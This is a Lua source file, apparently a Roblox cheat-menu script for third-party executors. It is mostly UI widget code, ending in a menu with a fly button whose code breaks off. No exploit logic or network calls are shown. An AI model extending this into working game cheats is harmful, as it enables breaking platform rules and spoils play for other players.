          local SectionText = Instance.new("TextLabel")
          local SectionOpen = Instance.new("ImageLabel")
          local SectionOpened = Instance.new("ImageLabel")
          local SectionToggle = Instance.new("ImageButton")
          local Objs = Instance.new("Frame")
          local ObjsL = Instance.new("UIListLayout")
    
          Section.Name = "Section"
          Section.Parent = Tab
          Section.BackgroundColor3 = zyColor
          Section.BackgroundTransparency = 1.000
          Section.BorderSizePixel = 0
          Section.ClipsDescendants = true
          Section.Size = UDim2.new(0.981000006, 0, 0, 36)
          
          SectionC.CornerRadius = UDim.new(0, 6)
          SectionC.Name = "SectionC"
          SectionC.Parent = Section
          
          SectionText.Name = "SectionText"
          SectionText.Parent = Section
          SectionText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          SectionText.BackgroundTransparency = 1.000
          SectionText.Position = UDim2.new(0.0887396261, 0, 0, 0)
          SectionText.Size = UDim2.new(0, 401, 0, 36)
          SectionText.Font = Enum.Font.GothamSemibold
          SectionText.Text = name
          SectionText.TextColor3 = Color3.fromRGB(255, 255, 255)
          SectionText.TextSize = 16.000
          SectionText.TextXAlignment = Enum.TextXAlignment.Left
          
          SectionOpen.Name = "SectionOpen"
          SectionOpen.Parent = SectionText
          SectionOpen.BackgroundTransparency = 1
          SectionOpen.BorderSizePixel = 0
          SectionOpen.Position = UDim2.new(0, -33, 0, 5)
          SectionOpen.Size = UDim2.new(0, 26, 0, 26)
          SectionOpen.Image = "http://www.roblox.com/asset/?id=6031302934"
          
          SectionOpened.Name = "SectionOpened"
          SectionOpened.Parent = SectionOpen
          SectionOpened.BackgroundTransparency = 1.000
          SectionOpened.BorderSizePixel = 0
          SectionOpened.Size = UDim2.new(0, 26, 0, 26)
          SectionOpened.Image = "http://www.roblox.com/asset/?id=6031302932"
          SectionOpened.ImageTransparency = 1.000
    
          SectionToggle.Name = "SectionToggle"
          SectionToggle.Parent = SectionOpen
          SectionToggle.BackgroundTransparency = 1
          SectionToggle.BorderSizePixel = 0
          SectionToggle.Size = UDim2.new(0, 26, 0, 26)
          
          Objs.Name = "Objs"
          Objs.Parent = Section
          Objs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          Objs.BackgroundTransparency = 1
          Objs.BorderSizePixel = 0
          Objs.Position = UDim2.new(0, 6, 0, 36)
          Objs.Size = UDim2.new(0.986347735, 0, 0, 0)
    
          ObjsL.Name = "ObjsL"
          ObjsL.Parent = Objs
          ObjsL.SortOrder = Enum.SortOrder.LayoutOrder
          ObjsL.Padding = UDim.new(0, 8) 
          
          local open = TabVal
          if TabVal ~= false then
            Section.Size = UDim2.new(0.981000006, 0, 0, open and 36 + ObjsL.AbsoluteContentSize.Y + 8 or 36)
            SectionOpened.ImageTransparency = (open and 0 or 1)
            SectionOpen.ImageTransparency = (open and 1 or 0)
          end
          
          SectionToggle.MouseButton1Click:Connect(function()
            open = not open
            Section.Size = UDim2.new(0.981000006, 0, 0, open and 36 + ObjsL.AbsoluteContentSize.Y + 8 or 36)
            SectionOpened.ImageTransparency = (open and 0 or 1)
            SectionOpen.ImageTransparency = (open and 1 or 0)
          end)
    
          ObjsL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            if not open then return end
            Section.Size = UDim2.new(0.981000006, 0, 0, 36 + ObjsL.AbsoluteContentSize.Y + 8)
          end)
    
          local section = {}
          function section.Button(section, text, callback)
            local callback = callback or function() end
    
            local BtnModule = Instance.new("Frame")
            local Btn = Instance.new("TextButton")
            local BtnC = Instance.new("UICorner")    
            
            BtnModule.Name = "BtnModule"
            BtnModule.Parent = Objs
            BtnModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            BtnModule.BackgroundTransparency = 1.000
            BtnModule.BorderSizePixel = 0
            BtnModule.Position = UDim2.new(0, 0, 0, 0)
            BtnModule.Size = UDim2.new(0, 428, 0, 38)
            
            Btn.Name = "Btn"
            Btn.Parent = BtnModule
            Btn.BackgroundColor3 = zyColor
            Btn.BorderSizePixel = 0
            Btn.Size = UDim2.new(0, 428, 0, 38)
            Btn.AutoButtonColor = false
            Btn.Font = Enum.Font.GothamSemibold
            Btn.Text = "   " .. text
            Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            Btn.TextSize = 16.000
            Btn.TextXAlignment = Enum.TextXAlignment.Left
            
            BtnC.CornerRadius = UDim.new(0, 6)
            BtnC.Name = "BtnC"
            BtnC.Parent = Btn
    
            Btn.MouseButton1Click:Connect(function()
                spawn(function()
                    Ripple(Btn)
                end)
                    spawn(callback)
                end)
            end
    
        function section:Label(text)
          local LabelModule = Instance.new("Frame")
          local TextLabel = Instance.new("TextLabel")
          local LabelC = Instance.new("UICorner")
          
          LabelModule.Name = "LabelModule"
          LabelModule.Parent = Objs
          LabelModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          LabelModule.BackgroundTransparency = 1.000
          LabelModule.BorderSizePixel = 0
          LabelModule.Position = UDim2.new(0, 0, NAN, 0)
          LabelModule.Size = UDim2.new(0, 428, 0, 19)
    
          TextLabel.Parent = LabelModule
          TextLabel.BackgroundColor3 = zyColor
          TextLabel.Size = UDim2.new(0, 428, 0, 22)
          TextLabel.Font = Enum.Font.GothamSemibold
          TextLabel.Text = text
          TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
          TextLabel.TextSize = 14.000
    
          LabelC.CornerRadius = UDim.new(0, 6)
          LabelC.Name = "LabelC"
          LabelC.Parent = TextLabel
          return TextLabel
        end
    
          function section.Toggle(section, text, flag, enabled, callback)
            local callback = callback or function() end
            local enabled = enabled or false
            assert(text, "No text provided")
            assert(flag, "No flag provided")
    
            library.flags[flag] = enabled
    
            local ToggleModule = Instance.new("Frame")
            local ToggleBtn = Instance.new("TextButton")
            local ToggleBtnC = Instance.new("UICorner")
            local ToggleDisable = Instance.new("Frame")
            local ToggleSwitch = Instance.new("Frame")
            local ToggleSwitchC = Instance.new("UICorner")
            local ToggleDisableC = Instance.new("UICorner")
            
            ToggleModule.Name = "ToggleModule"
            ToggleModule.Parent = Objs
            ToggleModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ToggleModule.BackgroundTransparency = 1.000
            ToggleModule.BorderSizePixel = 0
            ToggleModule.Position = UDim2.new(0, 0, 0, 0)
            ToggleModule.Size = UDim2.new(0, 428, 0, 38)
            
            ToggleBtn.Name = "ToggleBtn"
            ToggleBtn.Parent = ToggleModule
            ToggleBtn.BackgroundColor3 = zyColor
            ToggleBtn.BorderSizePixel = 0
            ToggleBtn.Size = UDim2.new(0, 428, 0, 38)
            ToggleBtn.AutoButtonColor = false
            ToggleBtn.Font = Enum.Font.GothamSemibold
            ToggleBtn.Text = "   " .. text
            ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            ToggleBtn.TextSize = 16.000
            ToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
            
            ToggleBtnC.CornerRadius = UDim.new(0, 6)
            ToggleBtnC.Name = "ToggleBtnC"
            ToggleBtnC.Parent = ToggleBtn
            
            ToggleDisable.Name = "ToggleDisable"
            ToggleDisable.Parent = ToggleBtn
            ToggleDisable.BackgroundColor3 = Background
            ToggleDisable.BorderSizePixel = 0
            ToggleDisable.Position = UDim2.new(0.901869178, 0, 0.208881587, 0)
            ToggleDisable.Size = UDim2.new(0, 36, 0, 22)
            
            ToggleSwitch.Name = "ToggleSwitch"
            ToggleSwitch.Parent = ToggleDisable
            ToggleSwitch.BackgroundColor3 = beijingColor
            ToggleSwitch.Size = UDim2.new(0, 24, 0, 22)
            
            ToggleSwitchC.CornerRadius = UDim.new(0, 6)
            ToggleSwitchC.Name = "ToggleSwitchC"
            ToggleSwitchC.Parent = ToggleSwitch
            
            ToggleDisableC.CornerRadius = UDim.new(0, 6)
            ToggleDisableC.Name = "ToggleDisableC"
            ToggleDisableC.Parent = ToggleDisable        
    
            local funcs = {
              SetState = function(self, state)
                if state == nil then state = not library.flags[flag] end
                if library.flags[flag] == state then return end
                services.TweenService:Create(ToggleSwitch, TweenInfo.new(0.2), {Position = UDim2.new(0, (state and ToggleSwitch.Size.X.Offset / 2 or 0), 0, 0), BackgroundColor3 = (state and Color3.fromRGB(255, 255, 255) or beijingColor)}):Play()
                library.flags[flag] = state
                callback(state)
              end,
              Module = ToggleModule
            }
            
            if enabled ~= false then
                funcs:SetState(flag,true)
            end
    
            ToggleBtn.MouseButton1Click:Connect(function()
              funcs:SetState()
            end)
            return funcs
          end
    
          function section.Keybind(section, text, default, callback)
            local callback = callback or function() end
            assert(text, "No text provided")
            assert(default, "No default key provided")
    
            local default = (typeof(default) == "string" and Enum.KeyCode[default] or default)
            local banned = {
              Return = true;
              Space = true;
              Tab = true;
              Backquote = true;
              CapsLock = true;
              Escape = true;
              Unknown = true;
            }
            local shortNames = {
              RightControl = 'Right Ctrl',
              LeftControl = 'Left Ctrl',
              LeftShift = 'Left Shift',
              RightShift = 'Right Shift',
              Semicolon = ";",
              Quote = '"',
              LeftBracket = '[',
              RightBracket = ']',
              Equals = '=',
              Minus = '-',
              RightAlt = 'Right Alt',
              LeftAlt = 'Left Alt'
            }
    
            local bindKey = default
            local keyTxt = (default and (shortNames[default.Name] or default.Name) or "None")
    
            local KeybindModule = Instance.new("Frame")
            local KeybindBtn = Instance.new("TextButton")
            local KeybindBtnC = Instance.new("UICorner")
            local KeybindValue = Instance.new("TextButton")
            local KeybindValueC = Instance.new("UICorner")
            local KeybindL = Instance.new("UIListLayout")
            local UIPadding = Instance.new("UIPadding")
    
            KeybindModule.Name = "KeybindModule"
            KeybindModule.Parent = Objs
            KeybindModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            KeybindModule.BackgroundTransparency = 1.000
            KeybindModule.BorderSizePixel = 0
            KeybindModule.Position = UDim2.new(0, 0, 0, 0)
            KeybindModule.Size = UDim2.new(0, 428, 0, 38)
            
            KeybindBtn.Name = "KeybindBtn"
            KeybindBtn.Parent = KeybindModule
            KeybindBtn.BackgroundColor3 = zyColor
            KeybindBtn.BorderSizePixel = 0
            KeybindBtn.Size = UDim2.new(0, 428, 0, 38)
            KeybindBtn.AutoButtonColor = false
            KeybindBtn.Font = Enum.Font.GothamSemibold
            KeybindBtn.Text = "   " .. text
            KeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            KeybindBtn.TextSize = 16.000
            KeybindBtn.TextXAlignment = Enum.TextXAlignment.Left
            
            KeybindBtnC.CornerRadius = UDim.new(0, 6)
            KeybindBtnC.Name = "KeybindBtnC"
            KeybindBtnC.Parent = KeybindBtn
            
            KeybindValue.Name = "KeybindValue"
            KeybindValue.Parent = KeybindBtn
            KeybindValue.BackgroundColor3 = Background
            KeybindValue.BorderSizePixel = 0
            KeybindValue.Position = UDim2.new(0.763033211, 0, 0.289473683, 0)
            KeybindValue.Size = UDim2.new(0, 100, 0, 28)
            KeybindValue.AutoButtonColor = false
            KeybindValue.Font = Enum.Font.Gotham
            KeybindValue.Text = keyTxt
            KeybindValue.TextColor3 = Color3.fromRGB(255, 255, 255)
            KeybindValue.TextSize = 14.000
            
            KeybindValueC.CornerRadius = UDim.new(0, 6)
            KeybindValueC.Name = "KeybindValueC"
            KeybindValueC.Parent = KeybindValue
            
            KeybindL.Name = "KeybindL"
            KeybindL.Parent = KeybindBtn
            KeybindL.HorizontalAlignment = Enum.HorizontalAlignment.Right
            KeybindL.SortOrder = Enum.SortOrder.LayoutOrder
            KeybindL.VerticalAlignment = Enum.VerticalAlignment.Center
            
            UIPadding.Parent = KeybindBtn
            UIPadding.PaddingRight = UDim.new(0, 6)   
            
            services.UserInputService.InputBegan:Connect(function(inp, gpe)
              if gpe then return end
              if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
              if inp.KeyCode ~= bindKey then return end
              callback(bindKey.Name)
            end)
            
            KeybindValue.MouseButton1Click:Connect(function()
              KeybindValue.Text = "..."
              wait()
              local key, uwu = services.UserInputService.InputEnded:Wait()
              local keyName = tostring(key.KeyCode.Name)
              if key.UserInputType ~= Enum.UserInputType.Keyboard then
                KeybindValue.Text = keyTxt
                return
              end
              if banned[keyName] then
                KeybindValue.Text = keyTxt
                return
              end
              wait()
              bindKey = Enum.KeyCode[keyName]
              KeybindValue.Text = shortNames[keyName] or keyName
            end)
    
            KeybindValue:GetPropertyChangedSignal("TextBounds"):Connect(function()
              KeybindValue.Size = UDim2.new(0, KeybindValue.TextBounds.X + 30, 0, 28)
            end)
            KeybindValue.Size = UDim2.new(0, KeybindValue.TextBounds.X + 30, 0, 28)
          end
    
          function section.Textbox(section, text, flag, default, callback)
            local callback = callback or function() end
            assert(text, "No text provided")
            assert(flag, "No flag provided")
            assert(default, "No default text provided")
    
            library.flags[flag] = default
    
            local TextboxModule = Instance.new("Frame")
            local TextboxBack = Instance.new("TextButton")
            local TextboxBackC = Instance.new("UICorner")
            local BoxBG = Instance.new("TextButton")
            local BoxBGC = Instance.new("UICorner")
            local TextBox = Instance.new("TextBox")
            local TextboxBackL = Instance.new("UIListLayout")
            local TextboxBackP = Instance.new("UIPadding")  
    
            TextboxModule.Name = "TextboxModule"
            TextboxModule.Parent = Objs
            TextboxModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextboxModule.BackgroundTransparency = 1.000
            TextboxModule.BorderSizePixel = 0
            TextboxModule.Position = UDim2.new(0, 0, 0, 0)
            TextboxModule.Size = UDim2.new(0, 428, 0, 38)
            
            TextboxBack.Name = "TextboxBack"
            TextboxBack.Parent = TextboxModule
            TextboxBack.BackgroundColor3 = zyColor
            TextboxBack.BorderSizePixel = 0
            TextboxBack.Size = UDim2.new(0, 428, 0, 38)
            TextboxBack.AutoButtonColor = false
            TextboxBack.Font = Enum.Font.GothamSemibold
            TextboxBack.Text = "   " .. text
            TextboxBack.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextboxBack.TextSize = 16.000
            TextboxBack.TextXAlignment = Enum.TextXAlignment.Left
            
            TextboxBackC.CornerRadius = UDim.new(0, 6)
            TextboxBackC.Name = "TextboxBackC"
            TextboxBackC.Parent = TextboxBack
            
            BoxBG.Name = "BoxBG"
            BoxBG.Parent = TextboxBack
            BoxBG.BackgroundColor3 = Background
            BoxBG.BorderSizePixel = 0
            BoxBG.Position = UDim2.new(0.763033211, 0, 0.289473683, 0)
            BoxBG.Size = UDim2.new(0, 100, 0, 28)
            BoxBG.AutoButtonColor = false
            BoxBG.Font = Enum.Font.Gotham
            BoxBG.Text = ""
            BoxBG.TextColor3 = Color3.fromRGB(255, 255, 255)
            BoxBG.TextSize = 14.000
            
            BoxBGC.CornerRadius = UDim.new(0, 6)
            BoxBGC.Name = "BoxBGC"
            BoxBGC.Parent = BoxBG
            
            TextBox.Parent = BoxBG
            TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.BackgroundTransparency = 1.000
            TextBox.BorderSizePixel = 0
            TextBox.Size = UDim2.new(1, 0, 1, 0)
            TextBox.Font = Enum.Font.Gotham
            TextBox.Text = default
            TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.TextSize = 14.000
            
            TextboxBackL.Name = "TextboxBackL"
            TextboxBackL.Parent = TextboxBack
            TextboxBackL.HorizontalAlignment = Enum.HorizontalAlignment.Right
            TextboxBackL.SortOrder = Enum.SortOrder.LayoutOrder
            TextboxBackL.VerticalAlignment = Enum.VerticalAlignment.Center
            
            TextboxBackP.Name = "TextboxBackP"
            TextboxBackP.Parent = TextboxBack
            TextboxBackP.PaddingRight = UDim.new(0, 6)
    
            TextBox.FocusLost:Connect(function()
              if TextBox.Text == "" then
                TextBox.Text = default
              end
              library.flags[flag] = TextBox.Text
              callback(TextBox.Text)
            end)
    
            TextBox:GetPropertyChangedSignal("TextBounds"):Connect(function()
              BoxBG.Size = UDim2.new(0, TextBox.TextBounds.X + 30, 0, 28)
            end)
            BoxBG.Size = UDim2.new(0, TextBox.TextBounds.X + 30, 0, 28)
          end
    
          function section.Slider(section, text, flag, default, min, max, precise, callback)
            local callback = callback or function() end
            local min = min or 1
            local max = max or 10
            local default = default or min
            local precise = precise or false
    
            library.flags[flag] = default
    
            assert(text, "No text provided")
            assert(flag, "No flag provided")
            assert(default, "No default value provided")
            
            local SliderModule = Instance.new("Frame")
            local SliderBack = Instance.new("TextButton")
            local SliderBackC = Instance.new("UICorner")
            local SliderBar = Instance.new("Frame")
            local SliderBarC = Instance.new("UICorner")
            local SliderPart = Instance.new("Frame")
            local SliderPartC = Instance.new("UICorner")
            local SliderValBG = Instance.new("TextButton")
            local SliderValBGC = Instance.new("UICorner")
            local SliderValue = Instance.new("TextBox")
            local MinSlider = Instance.new("TextButton")
            local AddSlider = Instance.new("TextButton")   
            
            SliderModule.Name = "SliderModule"
            SliderModule.Parent = Objs
            SliderModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            SliderModule.BackgroundTransparency = 1.000
            SliderModule.BorderSizePixel = 0
            SliderModule.Position = UDim2.new(0, 0, 0, 0)
            SliderModule.Size = UDim2.new(0, 428, 0, 38)
            
            SliderBack.Name = "SliderBack"
            SliderBack.Parent = SliderModule
            SliderBack.BackgroundColor3 = zyColor
            SliderBack.BorderSizePixel = 0
            SliderBack.Size = UDim2.new(0, 428, 0, 38)
            SliderBack.AutoButtonColor = false
            SliderBack.Font = Enum.Font.GothamSemibold
            SliderBack.Text = "   " .. text
            SliderBack.TextColor3 = Color3.fromRGB(255, 255, 255)
            SliderBack.TextSize = 16.000
            SliderBack.TextXAlignment = Enum.TextXAlignment.Left
            
            SliderBackC.CornerRadius = UDim.new(0, 6)
            SliderBackC.Name = "SliderBackC"
            SliderBackC.Parent = SliderBack
            
            SliderBar.Name = "SliderBar"
            SliderBar.Parent = SliderBack
            SliderBar.AnchorPoint = Vector2.new(0, 0.5)
            SliderBar.BackgroundColor3 = Background
            SliderBar.BorderSizePixel = 0
            SliderBar.Position = UDim2.new(0.369000018, 40, 0.5, 0)
            SliderBar.Size = UDim2.new(0, 140, 0, 12)
            
            SliderBarC.CornerRadius = UDim.new(0, 4)
            SliderBarC.Name = "SliderBarC"
            SliderBarC.Parent = SliderBar
            
            SliderPart.Name = "SliderPart"
            SliderPart.Parent = SliderBar
            SliderPart.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            SliderPart.BorderSizePixel = 0
            SliderPart.Size = UDim2.new(0, 54, 0, 13)
            
            SliderPartC.CornerRadius = UDim.new(0, 4)
            SliderPartC.Name = "SliderPartC"
            SliderPartC.Parent = SliderPart
            
            SliderValBG.Name = "SliderValBG"
            SliderValBG.Parent = SliderBack
            SliderValBG.BackgroundColor3 = Background
            SliderValBG.BorderSizePixel = 0
            SliderValBG.Position = UDim2.new(0.883177578, 0, 0.131578952, 0)
            SliderValBG.Size = UDim2.new(0, 44, 0, 28)
            SliderValBG.AutoButtonColor = false
            SliderValBG.Font = Enum.Font.Gotham
            SliderValBG.Text = ""
            SliderValBG.TextColor3 = Color3.fromRGB(255, 255, 255)
            SliderValBG.TextSize = 14.000
            
            SliderValBGC.CornerRadius = UDim.new(0, 6)
            SliderValBGC.Name = "SliderValBGC"
            SliderValBGC.Parent = SliderValBG
            
            SliderValue.Name = "SliderValue"
            SliderValue.Parent = SliderValBG
            SliderValue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            SliderValue.BackgroundTransparency = 1.000
            SliderValue.BorderSizePixel = 0
            SliderValue.Size = UDim2.new(1, 0, 1, 0)
            SliderValue.Font = Enum.Font.Gotham
            SliderValue.Text = "1000"
            SliderValue.TextColor3 = Color3.fromRGB(255, 255, 255)
            SliderValue.TextSize = 14.000
            
            MinSlider.Name = "MinSlider"
            MinSlider.Parent = SliderModule
            MinSlider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            MinSlider.BackgroundTransparency = 1.000
            MinSlider.BorderSizePixel = 0
            MinSlider.Position = UDim2.new(0.296728969, 40, 0.236842096, 0)
            MinSlider.Size = UDim2.new(0, 20, 0, 20)
            MinSlider.Font = Enum.Font.Gotham
            MinSlider.Text = "-"
            MinSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
            MinSlider.TextSize = 24.000
            MinSlider.TextWrapped = true
            
            AddSlider.Name = "AddSlider"
            AddSlider.Parent = SliderModule
            AddSlider.AnchorPoint = Vector2.new(0, 0.5)
            AddSlider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            AddSlider.BackgroundTransparency = 1.000
            AddSlider.BorderSizePixel = 0
            AddSlider.Position = UDim2.new(0.810906529, 0, 0.5, 0)
            AddSlider.Size = UDim2.new(0, 20, 0, 20)
            AddSlider.Font = Enum.Font.Gotham
            AddSlider.Text = "+"
            AddSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
            AddSlider.TextSize = 24.000
            AddSlider.TextWrapped = true
            
            local funcs = {
              SetValue = function(self, value)
                local percent = (mouse.X - SliderBar.AbsolutePosition.X) / SliderBar.AbsoluteSize.X
                if value then
                  percent = (value - min) / (max - min)
                end
                percent = math.clamp(percent, 0, 1)
                if precise then
                  value = value or tonumber(string.format("%.1f", tostring(min + (max - min) * percent)))
                else
                  value = value or math.floor(min + (max - min) * percent)
                end
                library.flags[flag] = tonumber(value)
                SliderValue.Text = tostring(value)
                SliderPart.Size = UDim2.new(percent, 0, 1, 0)
                callback(tonumber(value))
              end
            }
    
            MinSlider.MouseButton1Click:Connect(function()
              local currentValue = library.flags[flag]
              currentValue = math.clamp(currentValue - 1, min, max)
              funcs:SetValue(currentValue)
            end)
    
            AddSlider.MouseButton1Click:Connect(function()
              local currentValue = library.flags[flag]
              currentValue = math.clamp(currentValue + 1, min, max)
              funcs:SetValue(currentValue)
            end)
            
            funcs:SetValue(default)
    
            local dragging, boxFocused, allowed = false, false, {
              [""] = true,
              ["-"] = true
            }
    
            SliderBar.InputBegan:Connect(function(input)
              if input.UserInputType == Enum.UserInputType.MouseButton1 then
                funcs:SetValue()
                dragging = true
              end
            end)
    
            services.UserInputService.InputEnded:Connect(function(input)
              if dragging and input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = false
              end
            end)
    
            services.UserInputService.InputChanged:Connect(function(input)
              if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                funcs:SetValue()
              end
            end)

            SliderBar.InputBegan:Connect(function(input)
              if input.UserInputType == Enum.UserInputType.Touch then
                funcs:SetValue()
                dragging = true
              end
            end)
    
            services.UserInputService.InputEnded:Connect(function(input)
              if dragging and input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
              end
            end)
    
            services.UserInputService.InputChanged:Connect(function(input)
              if dragging and input.UserInputType == Enum.UserInputType.Touch then
                funcs:SetValue()
              end
            end)
    
            SliderValue.Focused:Connect(function()
              boxFocused = true
            end)
    
            SliderValue.FocusLost:Connect(function()
              boxFocused = false
              if SliderValue.Text == "" then
                funcs:SetValue(default)
              end
            end)
    
            SliderValue:GetPropertyChangedSignal("Text"):Connect(function()
              if not boxFocused then return end
              SliderValue.Text = SliderValue.Text:gsub("%D+", "")
              
              local text = SliderValue.Text
              
              if not tonumber(text) then
                SliderValue.Text = SliderValue.Text:gsub('%D+', '')
              elseif not allowed[text] then
                if tonumber(text) > max then
                  text = max
                  SliderValue.Text = tostring(max)
                end
                funcs:SetValue(tonumber(text))
              end
            end)
    
            return funcs
          end
          function section.Dropdown(section, text, flag, options, callback)
            local callback = callback or function() end
            local options = options or {}
            assert(text, "No text provided")
            assert(flag, "No flag provided")
    
            library.flags[flag] = nil
            
            local DropdownModule = Instance.new("Frame")
            local DropdownTop = Instance.new("TextButton")
            local DropdownTopC = Instance.new("UICorner")
            local DropdownOpen = Instance.new("TextButton")
            local DropdownText = Instance.new("TextBox")
            local DropdownModuleL = Instance.new("UIListLayout")
            local Option = Instance.new("TextButton")
            local OptionC = Instance.new("UICorner")        
    
            DropdownModule.Name = "DropdownModule"
            DropdownModule.Parent = Objs
            DropdownModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropdownModule.BackgroundTransparency = 1.000
            DropdownModule.BorderSizePixel = 0
            DropdownModule.ClipsDescendants = true
            DropdownModule.Position = UDim2.new(0, 0, 0, 0)
            DropdownModule.Size = UDim2.new(0, 428, 0, 38)
            
            DropdownTop.Name = "DropdownTop"
            DropdownTop.Parent = DropdownModule
            DropdownTop.BackgroundColor3 = zyColor
            DropdownTop.BorderSizePixel = 0
            DropdownTop.Size = UDim2.new(0, 428, 0, 38)
            DropdownTop.AutoButtonColor = false
            DropdownTop.Font = Enum.Font.GothamSemibold
            DropdownTop.Text = ""
            DropdownTop.TextColor3 = Color3.fromRGB(255, 255, 255)
            DropdownTop.TextSize = 16.000
            DropdownTop.TextXAlignment = Enum.TextXAlignment.Left
            
            DropdownTopC.CornerRadius = UDim.new(0, 6)
            DropdownTopC.Name = "DropdownTopC"
            DropdownTopC.Parent = DropdownTop
            
            DropdownOpen.Name = "DropdownOpen"
            DropdownOpen.Parent = DropdownTop
            DropdownOpen.AnchorPoint = Vector2.new(0, 0.5)
            DropdownOpen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropdownOpen.BackgroundTransparency = 1.000
            DropdownOpen.BorderSizePixel = 0
            DropdownOpen.Position = UDim2.new(0.918383181, 0, 0.5, 0)
            DropdownOpen.Size = UDim2.new(0, 20, 0, 20)
            DropdownOpen.Font = Enum.Font.Gotham
            DropdownOpen.Text = "+"
            DropdownOpen.TextColor3 = Color3.fromRGB(255, 255, 255)
            DropdownOpen.TextSize = 24.000
            DropdownOpen.TextWrapped = true
            
            DropdownText.Name = "DropdownText"
            DropdownText.Parent = DropdownTop
            DropdownText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropdownText.BackgroundTransparency = 1.000
            DropdownText.BorderSizePixel = 0
            DropdownText.Position = UDim2.new(0.0373831764, 0, 0, 0)
            DropdownText.Size = UDim2.new(0, 184, 0, 38)
            DropdownText.Font = Enum.Font.GothamSemibold
            DropdownText.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
            DropdownText.PlaceholderText = text
            DropdownText.Text = ""
            DropdownText.TextColor3 = Color3.fromRGB(255, 255, 255)
            DropdownText.TextSize = 16.000
            DropdownText.TextXAlignment = Enum.TextXAlignment.Left
            
            DropdownModuleL.Name = "DropdownModuleL"
            DropdownModuleL.Parent = DropdownModule
            DropdownModuleL.SortOrder = Enum.SortOrder.LayoutOrder
            DropdownModuleL.Padding = UDim.new(0, 4)
    
            local setAllVisible = function()
              local options = DropdownModule:GetChildren() 
              for i=1, #options do
                local option = options[i]
                if option:IsA("TextButton") and option.Name:match("Option_") then
                  option.Visible = true
                end
              end
            end
    
            local searchDropdown = function(text)
              local options = DropdownModule:GetChildren()
              for i=1, #options do
                local option = options[i]
                if text == "" then
                  setAllVisible()
                else
                  if option:IsA("TextButton") and option.Name:match("Option_") then
                    if option.Text:lower():match(text:lower()) then
                      option.Visible = true
                    else
                      option.Visible = false
                    end
                  end
                end
              end
            end
    
            local open = false
            local ToggleDropVis = function()
              open = not open
              if open then setAllVisible() end
              DropdownOpen.Text = (open and "-" or "+")
              DropdownModule.Size = UDim2.new(0, 428, 0, (open and DropdownModuleL.AbsoluteContentSize.Y + 4 or 38))
            end
    
            DropdownOpen.MouseButton1Click:Connect(ToggleDropVis)
            DropdownText.Focused:Connect(function()
              if open then return end
              ToggleDropVis()
            end)
    
            DropdownText:GetPropertyChangedSignal("Text"):Connect(function()
              if not open then return end
              searchDropdown(DropdownText.Text)
            end)
    
            DropdownModuleL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
              if not open then return end
              DropdownModule.Size = UDim2.new(0, 428, 0, (DropdownModuleL.AbsoluteContentSize.Y + 4))
            end)
            
            local funcs = {}
            funcs.AddOption = function(self, option)
              local Option = Instance.new("TextButton")
              local OptionC = Instance.new("UICorner")     
    
              Option.Name = "Option_" .. option
              Option.Parent = DropdownModule
              Option.BackgroundColor3 = zyColor
              Option.BorderSizePixel = 0
              Option.Position = UDim2.new(0, 0, 0.328125, 0)
              Option.Size = UDim2.new(0, 428, 0, 26)
              Option.AutoButtonColor = false
              Option.Font = Enum.Font.Gotham
              Option.Text = option
              Option.TextColor3 = Color3.fromRGB(255, 255, 255)
              Option.TextSize = 14.000
              
              OptionC.CornerRadius = UDim.new(0, 6)
              OptionC.Name = "OptionC"
              OptionC.Parent = Option
    
              Option.MouseButton1Click:Connect(function()
                ToggleDropVis()
                callback(Option.Text)
                DropdownText.Text = Option.Text
                library.flags[flag] = Option.Text
              end)
            end
    
            funcs.RemoveOption = function(self, option)
              local option = DropdownModule:FindFirstChild("Option_" .. option)
              if option then option:Destroy() end
            end
    
            funcs.SetOptions = function(self, options)
              for _, v in next, DropdownModule:GetChildren() do
                if v.Name:match("Option_") then
                  v:Destroy()
                end
              end
              for _,v in next, options do
                funcs:AddOption(v)
              end
            end
    
            funcs:SetOptions(options)
    
            return funcs
          end
          return section
        end
        return tab
      end
      return window
    end
    
    
local window = library:new("繁星脚本")

local creds = window:Tab("信息",'6035145364')

local bin = creds:section("信息",true)

    bin:Label("你的用户名："..game.Players.LocalPlayer.Character.Humanoid.Name)
    bin:Label("你的注入器:"..identifyexecutor())

local credits = creds:section("UI设置",true)

    credits:Button("摧毁UI",function()
        game:GetService("CoreGui")["frosty"]:Destroy()
    end)

    credits:Toggle("彩虹UI", "", false, function(state)
        if state then
        game:GetService("CoreGui")["frosty"].Main.Style = "DropShadow"
        else
            game:GetService("CoreGui")["frosty"].Main.Style = "Custom"
        end
    end)
    
local creds = window:Tab("通用",'6035145364')

local tool = creds:section("通用",true)

tool:Button("飞行",function()
        game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "Credits";
                Text ="zhanghuihuihui";
                Duration = 2.5;
            })
-- Gui to Lua
-- Version: 3.2

-- Instances:
